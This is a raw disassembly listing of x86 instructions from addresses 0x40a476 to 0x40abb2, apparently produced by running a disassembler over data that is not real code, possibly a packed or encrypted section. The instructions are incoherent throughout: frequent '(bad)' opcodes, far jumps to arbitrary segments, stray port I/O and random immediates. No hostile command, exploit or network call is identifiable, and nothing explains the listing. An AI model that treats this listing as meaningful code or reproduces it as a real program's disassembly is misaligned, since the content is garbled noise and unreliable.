  40a476:	or     al,0xb8
  40a478:	pop    ss
  40a479:	fcmovu st,st(7)
  40a47b:	add    al,0xb6
  40a47d:	stos   BYTE PTR es:[edi],al
  40a47e:	mov    esp,0x482118b5
  40a483:	test   DWORD PTR [ebx],ecx
  40a485:	pop    ebp
  40a486:	pop    esi
  40a487:	mov    edx,0xea641b7c
  40a48c:	cld    
  40a48d:	push   ss
  40a48e:	(bad)  
  40a490:	sti    
  40a491:	sbb    ebp,DWORD PTR [ebx-0x6f]
  40a494:	(bad)  
  40a495:	(bad)  
  40a496:	in     al,dx
  40a497:	retf   0x7385
  40a49a:	leave  
  40a49b:	bound  edx,QWORD PTR [ecx]
  40a49d:	pop    eax
  40a49e:	sbb    al,0x63
  40a4a0:	jmp    0x7684:0xbdfa1374
  40a4a7:	dec    ebx
  40a4a8:	xchg   edx,eax
  40a4a9:	adc    eax,0x8aca35da
  40a4ae:	push   esi
  40a4af:	pop    es
  40a4b0:	(bad)  
  40a4b1:	adc    bh,bl
  40a4b3:	in     al,dx
  40a4b4:	and    bh,bl
  40a4b6:	scas   al,BYTE PTR es:[edi]
  40a4b7:	fisub  WORD PTR [ebp+0x11]
  40a4ba:	shl    DWORD PTR [ebp+0x51],1
  40a4bd:	das    
  40a4be:	pop    ebx
  40a4bf:	sbb    ebp,DWORD PTR [esp+edx*1-0x29]
  40a4c3:	inc    edi
  40a4c4:	xor    BYTE PTR ds:0x4dfde3e2,ch
  40a4ca:	pop    ebx
  40a4cb:	loope  0x40a51a
  40a4cd:	mov    edx,edx
  40a4cf:	mov    bl,0xa
  40a4d1:	fdivr  QWORD PTR [ecx]
  40a4d3:	mov    esp,0xacf0032f
  40a4d8:	and    DWORD PTR [edi+esi*2+0x3e],ebp
  40a4dc:	or     BYTE PTR [ebx],ah
  40a4de:	adc    eax,0xb22948ba
  40a4e3:	push   ss
  40a4e4:	fldcw  WORD PTR [eiz*2-0x4d36b4c2]
  40a4eb:	xchg   esp,eax
  40a4ec:	jl     0x40a55c
  40a4ee:	sub    DWORD PTR [edi],ecx
  40a4f0:	mov    edi,0x6a7fc7cd
  40a4f5:	(bad)  
  40a4f6:	into   
  40a4f7:	mov    ds,WORD PTR [ebx]
  40a4f9:	in     al,0x13
  40a4fb:	addr16 cli 
  40a4fd:	xor    eax,0xedc6f987
  40a502:	mov    ds:0xa6970d99,eax
  40a507:	sub    DWORD PTR [ecx-0x66],ebp
  40a50a:	xacquire xchg DWORD PTR [edi-0x2],ebx
  40a50e:	sbb    bl,bh
  40a510:	jl     0x40a4f3
  40a512:	adc    bl,BYTE PTR [ebx-0x59]
  40a515:	sahf   
  40a516:	bound  esi,QWORD PTR [ebx-0x5]
  40a519:	sbb    al,0x1b
  40a51b:	fwait
  40a51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a51d:	dec    eax
  40a51e:	rcr    DWORD PTR [esi+0x7d],cl
  40a521:	enter  0x472e,0x58
  40a525:	dec    esp
  40a526:	aad    0xf9
  40a528:	loop   0x40a549
  40a52a:	mov    edx,DWORD PTR [edi]
  40a52c:	push   ebp
  40a52d:	mov    ebp,0xae5cbd72
  40a532:	inc    esi
  40a533:	push   es
  40a534:	push   esi
  40a535:	pop    eax
  40a536:	cdq    
  40a537:	adc    eax,0xf86fed
  40a53c:	mov    WORD PTR [esi],?
  40a53e:	je     0x40a57a
  40a540:	push   ebx
  40a541:	xchg   edi,eax
  40a542:	inc    ebx
  40a543:	xchg   edx,eax
  40a544:	sbb    eax,0x4700026d
  40a549:	cdq    
  40a54a:	add    BYTE PTR [edi+0x72],ch
  40a54d:	lahf   
  40a54e:	push   edi
  40a54f:	add    ecx,DWORD PTR [edx+0xc38e5]
  40a555:	shr    BYTE PTR [esi],0x53
  40a558:	xor    al,0x89
  40a55a:	dec    esp
  40a55b:	pop    edx
  40a55c:	mov    WORD PTR [edi-0x22],gs
  40a55f:	test   al,0x7a
  40a561:	clc    
  40a562:	push   ebp
  40a563:	pop    esi
  40a564:	(bad)  
  40a566:	ins    BYTE PTR es:[edi],dx
  40a567:	js     0x40a590
  40a569:	jb     0x40a592
  40a56b:	jo     0x40a5d5
  40a56d:	add    al,0x9d
  40a570:	inc    eax
  40a571:	and    eax,0xd68b16de
  40a576:	call   0x8e3e:0xf23cf22
  40a57d:	mov    esi,0x86b5852b
  40a582:	sub    edx,DWORD PTR [edi+0x6e]
  40a585:	arpl   bp,sp
  40a587:	jbe    0x40a51e
  40a589:	add    al,0x24
  40a58b:	inc    ebp
  40a58c:	sbb    cl,dh
  40a58e:	push   ss
  40a58f:	(bad)  
  40a590:	and    eax,0xad84e3f8
  40a595:	cmp    ah,ah
  40a597:	ror    dl,1
  40a599:	sbb    al,0xb3
  40a59b:	pop    ss
  40a59c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a59d:	mov    DWORD PTR [edx+0x77684dd7],esp
  40a5a3:	adc    al,0x49
  40a5a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5a6:	leave  
  40a5a7:	dec    ebp
  40a5a8:	in     al,0x68
  40a5aa:	or     edx,DWORD PTR [edx]
  40a5ac:	(bad)  
  40a5ad:	(bad)  
  40a5ae:	xchg   edi,eax
  40a5af:	xchg   edx,eax
  40a5b0:	js     0x40a574
  40a5b2:	cmp    DWORD PTR [ebx+0x2bbf715a],ebp
  40a5b8:	adc    dl,cl
  40a5ba:	xor    al,0x21
  40a5bc:	and    ah,BYTE PTR [edi+0x63]
  40a5bf:	int    0xbe
  40a5c1:	(bad)  
  40a5c2:	jge    0x40a5c5
  40a5c4:	loope  0x40a5e2
  40a5c6:	xchg   esi,eax
  40a5c7:	inc    ebp
  40a5c8:	or     edx,DWORD PTR [edi]
  40a5ca:	rol    edi,1
  40a5cc:	jmp    FWORD PTR [esi+0x3eea9bca]
  40a5d2:	sub    eax,0xca1a5d16
  40a5d7:	pop    esp
  40a5d8:	push   ebx
  40a5d9:	in     al,0x5
  40a5db:	inc    ebp
  40a5dc:	sahf   
  40a5dd:	xchg   edx,eax
  40a5de:	sub    DWORD PTR [bx-0x5045],eax
  40a5e3:	repz xchg ecx,eax
  40a5e5:	mul    DWORD PTR [edi]
  40a5e7:	pushf  
  40a5e8:	cmp    DWORD PTR [ebp+0x77ff7b5d],edi
  40a5ee:	jmp    0x40a5e5
  40a5f0:	inc    ebx
  40a5f1:	add    dl,BYTE PTR [eax-0x28]
  40a5f4:	sahf   
  40a5f5:	and    al,0x9
  40a5f7:	mov    ebp,0x5f178f5e
  40a5fc:	jl     0x40a587
  40a5fe:	das    
  40a5ff:	jge    0x40a5e6
  40a601:	inc    ebp
  40a602:	mov    edx,0xdad987c3
  40a607:	jns    0x40a599
  40a609:	loope  0x40a5f1
  40a60b:	imul   edi,DWORD PTR [edx],0x54c20d9d
  40a611:	fdivrp st(1),st
  40a613:	sub    edx,DWORD PTR [ebx]
  40a615:	ficom  WORD PTR [esi-0x71]
  40a618:	mov    bh,0x55
  40a61a:	mov    ch,0xb5
  40a61c:	retf   0x82c2
  40a61f:	and    eax,0xeb655ec5
  40a624:	push   edi
  40a625:	scas   al,BYTE PTR es:[edi]
  40a626:	nop
  40a627:	inc    esi
  40a628:	in     eax,dx
  40a629:	xchg   DWORD PTR [eax],ecx
  40a62b:	nop
  40a62c:	mov    esi,esp
  40a62e:	add    dl,ah
  40a630:	ds pop es
  40a632:	mov    al,ds:0xa6c48495
  40a637:	in     eax,0xec
  40a639:	mov    edi,0x72c3df0
  40a63e:	mov    dh,0x22
  40a640:	fwait
  40a641:	cmc    
  40a642:	retf   0xfdaf
  40a645:	fisubr DWORD PTR [edi-0x86f23cb]
  40a64b:	dec    edi
  40a64c:	mov    es,WORD PTR [ebx]
  40a64e:	add    BYTE PTR [edx],ah
  40a650:	and    BYTE PTR [edi+0x6d],dl
  40a653:	inc    eax
  40a654:	xchg   BYTE PTR [eax+0x23],dh
  40a657:	mov    edi,0x95af5d0a
  40a65c:	adc    BYTE PTR [edx+0x63eb6309],ch
  40a662:	je     0x40a69f
  40a664:	stos   BYTE PTR es:[edi],al
  40a665:	idiv   DWORD PTR [edi-0x45]
  40a668:	mov    dh,0xfc
  40a66a:	popf   
  40a66b:	in     al,0xb8
  40a66d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a66e:	inc    eax
  40a66f:	mov    ds:0x20516514,al
  40a674:	arpl   WORD PTR [edi],bx
  40a676:	xor    BYTE PTR [edi+0x3e],0xcd
  40a67a:	out    0x73,eax
  40a67c:	scas   al,BYTE PTR es:[edi]
  40a67d:	pop    ebp
  40a67e:	fwait
  40a67f:	cmp    BYTE PTR [eax],0x85
  40a682:	inc    eax
  40a683:	mov    al,ds:0xf9454494
  40a688:	or     esi,eax
  40a68a:	iret   
  40a68b:	xor    al,0xec
  40a68d:	xchg   edx,eax
  40a68e:	jnp    0x40a6a6
  40a690:	out    0xad,eax
  40a692:	sub    DWORD PTR [ecx-0x102e3f8b],edx
  40a698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a699:	hlt    
  40a69a:	mov    ebx,0x4969d309
  40a69f:	pop    ecx
  40a6a0:	pop    edx
  40a6a1:	mov    WORD PTR [esi-0x2ee3735f],fs
  40a6a7:	push   edx
  40a6a8:	ret    
  40a6a9:	stc    
  40a6aa:	loop   0x40a70a
  40a6ac:	aas    
  40a6ad:	hlt    
  40a6ae:	loop   0x40a64e
  40a6b0:	mov    bh,0x6c
  40a6b3:	mov    ds:0xc6a9da72,al
  40a6b8:	mov    cl,0x2b
  40a6ba:	cmp    al,0x65
  40a6bc:	adc    eax,0x17ef0450
  40a6c1:	sub    al,0x32
  40a6c3:	adc    bl,al
  40a6c5:	in     eax,0xc3
  40a6c7:	jne    0x40a725
  40a6c9:	jns    0x40a662
  40a6cb:	jmp    0x374a:0x2c41d6e3
  40a6d2:	push   ss
  40a6d3:	and    bl,cl
  40a6d5:	loope  0x40a737
  40a6d7:	(bad)  
  40a6d8:	cmp    al,0xef
  40a6da:	jg     0x40a6bc
  40a6dc:	and    BYTE PTR [edi],0x9f
  40a6df:	js     0x40a683
  40a6e1:	pop    edx
  40a6e2:	sub    BYTE PTR [ebx+0x44efb8d9],0xfb
  40a6e9:	add    eax,DWORD PTR [eax-0x816d6b5]
  40a6ef:	sti    
  40a6f0:	fdivr  QWORD PTR [eax-0x2206c87]
  40a6f6:	cld    
  40a6f7:	xor    ebp,DWORD PTR [eax-0x4f]
  40a6fa:	lds    ebp,FWORD PTR [ecx+0x370c73ad]
  40a700:	jbe    0x40a6ea
  40a702:	mov    ah,0x86
  40a704:	cwde   
  40a705:	push   edx
  40a706:	and    BYTE PTR [ecx+ebp*4-0x4d5756d7],al
  40a70d:	jbe    0x40a6d1
  40a70f:	leave  
  40a710:	loop   0x40a6b1
  40a712:	mov    ch,0x82
  40a714:	jne    0x40a70c
  40a716:	mov    edi,0x92686cc2
  40a71b:	mov    cl,0xf8
  40a71d:	dec    ebp
  40a71e:	les    edi,FWORD PTR [edi+0xd1bd283]
  40a724:	cmp    al,BYTE PTR [ebx]
  40a726:	cmp    eax,0x7a0a7283
  40a72b:	cmp    al,0x67
  40a72d:	out    0xd1,eax
  40a72f:	xchg   esp,eax
  40a730:	and    al,0x49
  40a732:	xor    DWORD PTR [esi],esp
  40a734:	pop    ebx
  40a735:	repnz inc bh
  40a738:	iret   
  40a739:	jle    0x40a78f
  40a73b:	adc    dl,al
  40a73d:	rol    BYTE PTR [ecx],cl
  40a73f:	not    DWORD PTR [ecx-0x72]
  40a742:	arpl   WORD PTR [edx],ax
  40a744:	pushf  
  40a745:	push   ss
  40a746:	inc    edx
  40a747:	mov    ah,0x57
  40a749:	cmc    
  40a74a:	loop   0x40a7a5
  40a74c:	scas   al,BYTE PTR es:[edi]
  40a74d:	sub    DWORD PTR [edx-0x61],ecx
  40a750:	ret    0x5388
  40a753:	test   cl,bh
  40a755:	jl     0x40a7a5
  40a757:	scas   eax,DWORD PTR es:[edi]
  40a758:	xlat   BYTE PTR ds:[ebx]
  40a759:	inc    edi
  40a75a:	sub    edi,esi
  40a75c:	repnz div edi
  40a75f:	imul   ecx
  40a761:	cmc    
  40a762:	jp     0x40a719
  40a764:	jecxz  0x40a6f4
  40a766:	sbb    esp,DWORD PTR [esi+0x4826555b]
  40a76c:	mov    bl,0x4c
  40a76e:	ins    BYTE PTR es:[edi],dx
  40a76f:	or     bl,ah
  40a771:	test   eax,0x7f298ff7
  40a776:	clc    
  40a777:	scas   al,BYTE PTR es:[edi]
  40a778:	lea    eax,[ecx+0x6]
  40a77b:	dec    eax
  40a77c:	idiv   DWORD PTR [ebp-0x1d2a549a]
  40a782:	retf   0xb7d5
  40a785:	fcomp  st(5)
  40a787:	ja     0x40a753
  40a789:	and    eax,0xe0123e04
  40a78e:	iret   
  40a78f:	addr16 push ss
  40a791:	cmp    eax,0x6621158e
  40a796:	pmaddwd mm6,mm7
  40a799:	in     eax,dx
  40a79a:	jp     0x40a7ea
  40a79c:	add    DWORD PTR [ebx+edi*1-0x76],esi
  40a7a0:	loope  0x40a752
  40a7a2:	(bad)
  40a7a5:	and    bl,cl
  40a7a7:	xor    eax,0x60673579
  40a7ac:	call   0x7e90ff0e
  40a7b1:	jmp    0x40a748
  40a7b3:	xor    DWORD PTR [eax],ebp
  40a7b5:	imul   edx,DWORD PTR [ebp-0x62],0x15
  40a7b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7ba:	inc    eax
  40a7bb:	mov    ds:0x7fc38fa7,eax
  40a7c0:	xor    eax,0xd92363a7
  40a7c5:	daa    
  40a7c6:	div    dl
  40a7c8:	push   edi
  40a7c9:	cmp    al,0x3a
  40a7cb:	push   es
  40a7cc:	add    DWORD PTR [ecx],edx
  40a7ce:	add    DWORD PTR [eax+0x6b40acf],0x30285c6d
  40a7d8:	retf   
  40a7d9:	or     al,0xb3
  40a7db:	fld    DWORD PTR [ecx]
  40a7dd:	out    0xb6,eax
  40a7df:	scas   eax,DWORD PTR es:[edi]
  40a7e0:	icebp  
  40a7e1:	ror    DWORD PTR [edi],1
  40a7e3:	mov    edi,0x5dbb7687
  40a7e8:	dec    ebp
  40a7e9:	jo     0x40a79c
  40a7eb:	jmp    0x413:0x4159367d
  40a7f2:	(bad)  
  40a7f4:	ss repz stc 
  40a7f7:	pushf  
  40a7f8:	(bad)  
  40a7f9:	cld    
  40a7fa:	mov    ecx,0x86e5732f
  40a7ff:	in     eax,0xcc
  40a801:	mov    ecx,0x4f0e1987
  40a806:	shr    ebx,1
  40a808:	outs   dx,DWORD PTR ds:[esi]
  40a809:	cmp    DWORD PTR [esi+0x70ceb157],esi
  40a80f:	outs   dx,DWORD PTR ds:[esi]
  40a810:	mov    ebp,DWORD PTR [edx]
  40a812:	test   al,0xba
  40a814:	out    dx,eax
  40a815:	clc    
  40a816:	jp     0x40a7a3
  40a818:	or     edx,edi
  40a81a:	mov    bh,0x35
  40a81c:	call   0x49b4:0x72fa5898
  40a823:	popa   
  40a824:	in     eax,dx
  40a825:	and    bh,bh
  40a827:	(bad)  
  40a829:	std    
  40a82a:	outs   dx,BYTE PTR ds:[esi]
  40a82b:	xor    DWORD PTR [eax+0x165d00a2],edx
  40a831:	or     al,0x7
  40a833:	lods   eax,DWORD PTR ds:[esi]
  40a834:	lds    edi,FWORD PTR [edx+edx*4+0x28193976]
  40a83b:	mov    WORD PTR [ecx+0x381cb158],es
  40a841:	mov    esp,0xc4818b0b
  40a846:	jb     0x40a864
  40a848:	add    BYTE PTR [eax+0x11],ch
  40a84b:	jmp    0xe3de:0x951c61aa
  40a852:	sbb    esp,DWORD PTR [esp+ecx*2]
  40a855:	mov    esi,0xefc5b4d1
  40a85a:	xchg   esi,eax
  40a85b:	scas   eax,DWORD PTR es:[edi]
  40a85c:	movq   mm3,QWORD PTR [edi]
  40a85f:	adc    al,0xee
  40a861:	xor    eax,0xfda7707a
  40a866:	(bad)  
  40a867:	sbb    BYTE PTR [edx],cl
  40a869:	arpl   WORD PTR [eax],bp
  40a86b:	repnz pushf 
  40a86d:	xor    al,0x4d
  40a86f:	pop    ebp
  40a870:	scas   al,BYTE PTR es:[edi]
  40a871:	mov    ecx,0x695a89ef
  40a876:	retf   0x9bad
  40a879:	sti    
  40a87a:	sbb    al,0x1e
  40a87c:	add    BYTE PTR [edx],dh
  40a87e:	dec    esp
  40a87f:	add    ah,dl
  40a881:	jge    0x40a883
  40a883:	(bad)  
  40a884:	mov    edi,0x1c45d8d8
  40a889:	adc    al,0x4c
  40a88b:	or     BYTE PTR [edi-0x3],cl
  40a88e:	pop    esp
  40a88f:	(bad)  
  40a890:	sbb    al,0x1c
  40a892:	test   BYTE PTR [edx],ch
  40a894:	xchg   ecx,eax
  40a895:	je     0x40a8d2
  40a897:	or     DWORD PTR [ebp-0x5b1e3d92],edi
  40a89d:	and    al,0xa7
  40a89f:	fs in  eax,0x2a
  40a8a2:	ds push ebp
  40a8a4:	outs   dx,DWORD PTR ds:[esi]
  40a8a5:	push   ds
  40a8a6:	fbstp  TBYTE PTR [ebx-0x5d]
  40a8a9:	dec    esp
  40a8aa:	std    
  40a8ab:	or     DWORD PTR [ecx+0x50],ebx
  40a8ae:	cmc    
  40a8af:	lock fld TBYTE PTR [esi+0x19871ed8]
  40a8b6:	pop    ecx
  40a8b7:	ss add eax,0x7e23ec6a
  40a8bd:	test   al,0xd8
  40a8bf:	and    al,0x71
  40a8c1:	or     eax,0x5aef5f17
  40a8c6:	mov    ebx,0xdddbd921
  40a8cb:	push   edi
  40a8cc:	clc    
  40a8cd:	hlt    
  40a8ce:	iret   
  40a8cf:	ds (bad) 
  40a8d1:	jmp    0xdd68d0a9
  40a8d6:	je     0x40a8a0
  40a8d8:	inc    edi
  40a8d9:	push   cs
  40a8da:	aam    0x5a
  40a8dc:	lds    eax,FWORD PTR [eax]
  40a8de:	ret    0x24ff
  40a8e1:	dec    ecx
  40a8e2:	dec    eax
  40a8e3:	xchg   edx,eax
  40a8e4:	test   BYTE PTR [edi],bh
  40a8e6:	cld    
  40a8e7:	repnz xor edi,DWORD PTR [ebx+edi*8-0x45]
  40a8ec:	xlat   BYTE PTR ds:[ebx]
  40a8ed:	fnstcw WORD PTR [edx]
  40a8ef:	icebp  
  40a8f0:	and    al,0xc3
  40a8f2:	int    0x53
  40a8f4:	or     al,0xaa
  40a8f6:	xor    al,0xdf
  40a8f8:	fcom   DWORD PTR [esi-0x67104572]
  40a8fe:	sub    al,0xe1
  40a900:	(bad)  
  40a901:	imul   eax,DWORD PTR [eax+eiz*8],0x33f036c7
  40a908:	or     al,0x6f
  40a90a:	data16 loope 0x40a903
  40a90d:	mov    BYTE PTR [esi+0x37],bh
  40a910:	stos   DWORD PTR es:[edi],eax
  40a911:	jbe    0x40a8a8
  40a913:	cmp    DWORD PTR [ecx],eax
  40a915:	fimul  WORD PTR [ecx]
  40a917:	test   al,0x3d
  40a919:	add    ecx,DWORD PTR [eax+0x66d680c2]
  40a91f:	and    al,0xca
  40a921:	push   esp
  40a922:	jae    0x40a975
  40a924:	mov    eax,0xe0db9663
  40a929:	jl     0x40a969
  40a92b:	pop    edi
  40a92c:	in     eax,0x24
  40a92e:	mov    bh,0xbc
  40a930:	mov    edx,DWORD PTR [ecx]
  40a932:	add    BYTE PTR [eax],bh
  40a934:	sahf   
  40a935:	or     DWORD PTR [eax-0x4],esp
  40a938:	inc    DWORD PTR [ebp-0x51]
  40a93b:	or     DWORD PTR [eax-0x2d792f5b],eax
  40a941:	das    
  40a942:	jne    0x40a958
  40a944:	sub    dh,BYTE PTR [eax+0x15]
  40a947:	mov    ebp,0x7707480b
  40a94c:	mov    dh,0xe5
  40a94e:	sbb    DWORD PTR [edi+esi*2],0x5f
  40a952:	jae    0x40a92f
  40a954:	sub    dl,BYTE PTR [esi]
  40a956:	jo     0x40a8ff
  40a958:	arpl   WORD PTR [ebp-0xb4d676c],sp
  40a95e:	(bad)  [ebp+0x7f57357e]
  40a964:	dec    DWORD PTR [ecx-0x66]
  40a967:	jo     0x40a94c
  40a969:	out    0x2d,al
  40a96b:	push   cs
  40a96c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a96d:	ror    BYTE PTR ds:0x12e116e,cl
  40a973:	sub    BYTE PTR [edx+ebx*1+0x1b87426c],ch
  40a97a:	out    dx,al
  40a97b:	bswap  edi
  40a97d:	add    ch,BYTE PTR [edx]
  40a97f:	pop    edi
  40a980:	inc    eax
  40a981:	add    BYTE PTR [eax],cl
  40a983:	pop    es
  40a984:	sub    BYTE PTR [edx-0x47],cl
  40a987:	nop
  40a988:	pusha  
  40a989:	mov    bh,0x93
  40a98b:	ror    BYTE PTR [edx+0x25],1
  40a98e:	mov    bl,0xc
  40a990:	mov    edi,0x2868815e
  40a995:	call   0xeb96367c
  40a99a:	push   cs
  40a99b:	xor    al,0x3d
  40a99d:	jp     0x40a9aa
  40a99f:	mov    ch,0x32
  40a9a1:	add    edx,0x23837ec7
  40a9a7:	sbb    DWORD PTR [edx+0x74],eax
  40a9aa:	into   
  40a9ab:	fucompp 
  40a9ad:	sbb    bh,BYTE PTR [esi+0x7d31a583]
  40a9b3:	jne    0x40a9e5
  40a9b5:	xor    DWORD PTR [esi+0x60],eax
  40a9b8:	mov    ah,0x61
  40a9ba:	mov    bl,0x73
  40a9bc:	cdq    
  40a9bd:	pop    edi
  40a9be:	cli    
  40a9bf:	dec    ebx
  40a9c0:	add    ebx,DWORD PTR [esi]
  40a9c2:	jle    0x40a9b4
  40a9c4:	fs aad 0xdb
  40a9c7:	lods   eax,DWORD PTR ds:[esi]
  40a9c8:	pop    edx
  40a9c9:	(bad)  
  40a9ca:	stos   DWORD PTR es:[edi],eax
  40a9cb:	cmp    cl,bl
  40a9cd:	adc    edi,ebx
  40a9cf:	xchg   ebp,eax
  40a9d0:	push   edx
  40a9d1:	mov    ah,0x5a
  40a9d3:	sub    eax,0xcbeefc5e
  40a9d8:	jl     0x40a9cb
  40a9da:	(bad)  
  40a9db:	mov    esi,0x11e36f43
  40a9e0:	inc    esi
  40a9e1:	pop    ebx
  40a9e2:	sbb    BYTE PTR [si],cl
  40a9e5:	dec    edi
  40a9e6:	xchg   ecx,eax
  40a9e7:	mov    dh,0x17
  40a9e9:	leave  
  40a9ea:	mov    ds:0x77c47a8a,al
  40a9f0:	mov    dh,0x42
  40a9f2:	jae    0x40aa17
  40a9f4:	push   ebx
  40a9f5:	int3   
  40a9f6:	xchg   BYTE PTR [ebp+0x62],ch
  40a9f9:	push   ecx
  40a9fa:	(bad)  
  40a9fb:	aad    0xa8
  40a9fd:	test   DWORD PTR [eax+0x7d8b6f],edi
  40aa03:	push   ecx
  40aa04:	mov    ch,0xad
  40aa06:	xchg   edx,eax
  40aa07:	push   0x49
  40aa09:	jo     0x40a9c6
  40aa0b:	mov    al,0xff
  40aa0d:	dec    ebx
  40aa0e:	or     eax,0x96ed2509
  40aa13:	hlt    
  40aa14:	mov    ?,ecx
  40aa16:	sbb    BYTE PTR [eax-0x6b99b65e],dh
  40aa1c:	bound  esi,QWORD PTR [edi+0x77]
  40aa1f:	ja     0x40aa76
  40aa21:	sbb    dh,BYTE PTR [eax+0x1]
  40aa24:	pop    esp
  40aa25:	pop    ecx
  40aa26:	jge    0x40a9ed
  40aa28:	sti    
  40aa29:	and    ebp,DWORD PTR [edi-0x75]
  40aa2c:	add    DWORD PTR [esi+edi*1+0x0],edx
  40aa30:	scas   eax,DWORD PTR es:[edi]
  40aa31:	lock pop ecx
  40aa33:	loope  0x40aa81
  40aa35:	cmp    BYTE PTR [eax-0xbef7b92],0x7a
  40aa3c:	cmp    eax,0x28a12492
  40aa41:	or     ah,BYTE PTR [esi]
  40aa43:	xchg   ebx,eax
  40aa44:	or     DWORD PTR [ebx+0x2e9ee8d1],esp
  40aa4a:	je     0x40aaa8
  40aa4c:	pop    edi
  40aa4d:	rcr    BYTE PTR [ebp+0x4a77ff3c],0xe
  40aa54:	push   0xffffff9e
  40aa56:	dec    edi
  40aa57:	or     BYTE PTR [ecx-0x17],al
  40aa5a:	pop    es
  40aa5b:	cmp    DWORD PTR [ecx+0x636a0873],eax
  40aa61:	call   0x6b59861a
  40aa66:	js     0x40aa4b
  40aa68:	int    0xeb
  40aa6a:	call   0xbbab32e1
  40aa6f:	clc    
  40aa70:	jg     0x40aa3a
  40aa72:	add    DWORD PTR [eax+0x4e100604],esi
  40aa78:	jmp    0x810a:0x918a9a7a
  40aa7f:	fwait
  40aa80:	sub    eax,eax
  40aa82:	sub    DWORD PTR [edx+0x68],edx
  40aa85:	ins    BYTE PTR es:[edi],dx
  40aa86:	lods   eax,DWORD PTR ds:[esi]
  40aa87:	mov    dh,0x4b
  40aa89:	pmaxsw mm3,QWORD PTR [esi]
  40aa8c:	and    al,0x4c
  40aa8e:	and    ax,0x3585
  40aa92:	pusha  
  40aa93:	jecxz  0x40ab0e
  40aa95:	add    ah,BYTE PTR [edx+0xfa6fbfc]
  40aa9b:	pusha  
  40aa9c:	aad    0x1a
  40aa9e:	xor    DWORD PTR ds:0x5dff805f,0xb
  40aaa5:	or     esi,DWORD PTR [esi]
  40aaa7:	fadd   DWORD PTR [ebx+esi*8+0x1c]
  40aaab:	push   ebp
  40aaac:	scas   eax,DWORD PTR es:[edi]
  40aaad:	out    dx,eax
  40aaae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaaf:	adc    eax,0x1845cdaf
  40aab4:	fisttp DWORD PTR [esi]
  40aab6:	jbe    0x40ab29
  40aab8:	mov    esp,0xd6b6414f
  40aabd:	rcl    BYTE PTR [esi+0x7],1
  40aac0:	jl     0x40aaa8
  40aac2:	addr16 data16 cld 
  40aac5:	fsub   QWORD PTR [edi]
  40aac7:	jle    0x40aa6b
  40aac9:	mov    ds:0x70274dfe,al
  40aace:	nop
  40aacf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aad0:	shr    DWORD PTR [edi+0x4e9dfca9],cl
  40aad6:	xchg   DWORD PTR [ebx-0x69],ecx
  40aad9:	scas   al,BYTE PTR es:[edi]
  40aada:	lock pop ds
  40aadc:	(bad)  
  40aadd:	repz push edi
  40aadf:	enter  0x16f5,0x67
  40aae3:	mov    bh,0x1e
  40aae5:	pusha  
  40aae6:	xor    BYTE PTR [eax],bh
  40aae8:	inc    ebp
  40aae9:	stos   DWORD PTR es:[edi],eax
  40aaea:	mov    ebp,0xeab23181
  40aaef:	ins    BYTE PTR es:[edi],dx
  40aaf0:	sub    dh,BYTE PTR [esi-0x3ce293d1]
  40aaf6:	push   esi
  40aaf7:	mov    dl,0x8d
  40aaf9:	pop    edx
  40aafa:	or     esp,DWORD PTR [ebp+0x51]
  40aafd:	ins    BYTE PTR es:[edi],dx
  40aafe:	rcr    esp,0x16
  40ab01:	ins    DWORD PTR es:[edi],dx
  40ab02:	mov    eax,ds:0xdfb5037a
  40ab07:	cmc    
  40ab08:	adc    ebp,DWORD PTR [esi]
  40ab0a:	stos   BYTE PTR es:[edi],al
  40ab0b:	cmp    eax,0xfc28019e
  40ab10:	iret   
  40ab11:	or     ebp,eax
  40ab13:	jbe    0x40ab41
  40ab15:	addr16 iret 
  40ab17:	in     al,dx
  40ab18:	push   eax
  40ab19:	xchg   esi,eax
  40ab1a:	retf   
  40ab1b:	adc    DWORD PTR [eax+0x534d3bf0],eax
  40ab21:	out    0xf3,al
  40ab23:	stc    
  40ab24:	sub    dl,BYTE PTR [ebx+0x617036f6]
  40ab2a:	lds    edx,FWORD PTR [ebp-0x78e36411]
  40ab30:	add    DWORD PTR [edx+eax*1+0x2b2bc15a],ebx
  40ab37:	mov    ds:0x3ca5deee,al
  40ab3c:	cmp    ch,BYTE PTR [edx+0x65]
  40ab3f:	mov    ebp,0xc179e5d2
  40ab44:	push   0x854a42d4
  40ab49:	(bad)  
  40ab4a:	jae    0x40aaf2
  40ab4c:	shr    ecx,cl
  40ab4e:	xchg   ecx,eax
  40ab4f:	das    
  40ab50:	cld    
  40ab51:	popf   
  40ab52:	mov    dl,0x0
  40ab54:	mov    eax,0x788058f3
  40ab59:	lahf   
  40ab5a:	jg     0x40aaf2
  40ab5c:	xchg   ebp,eax
  40ab5d:	mov    eax,es
  40ab5f:	sbb    BYTE PTR [ebx+0x3e],al
  40ab62:	lahf   
  40ab63:	push   edi
  40ab64:	imul   eax,DWORD PTR ds:0x3f309800,0xffffff9b
  40ab6b:	xor    eax,0x87b4ba5c
  40ab70:	xor    eax,0x4821d75d
  40ab75:	or     DWORD PTR [esp+eiz*2-0x5b],0x1acc2617
  40ab7d:	loope  0x40ab14
  40ab7f:	fbstp  TBYTE PTR [ebp-0x3e]
  40ab82:	pop    esi
  40ab83:	fld    DWORD PTR ds:0x46b16158
  40ab89:	jp     0x40abeb
  40ab8b:	adc    BYTE PTR [eax-0x1d],bl
  40ab8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab8f:	adc    ebp,edi
  40ab91:	je     0x40abef
  40ab93:	dec    eax
  40ab94:	jo     0x40ac05
  40ab96:	pop    edi
  40ab97:	push   eax
  40ab98:	push   0xffffffa7
  40ab9a:	dec    eax
  40ab9b:	mov    ch,0x89
  40ab9d:	cmp    DWORD PTR [ecx-0x727f2e73],esi
  40aba3:	sahf   
  40aba4:	sti    
  40aba5:	dec    eax
  40aba6:	pop    edi
  40aba7:	sbb    bh,0xb6
  40abaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abab:	in     al,0xbe
  40abad:	daa    
  40abae:	pmaxub mm7,QWORD PTR [esi+0x1b]
  40abb2:	cmp    edx,eax
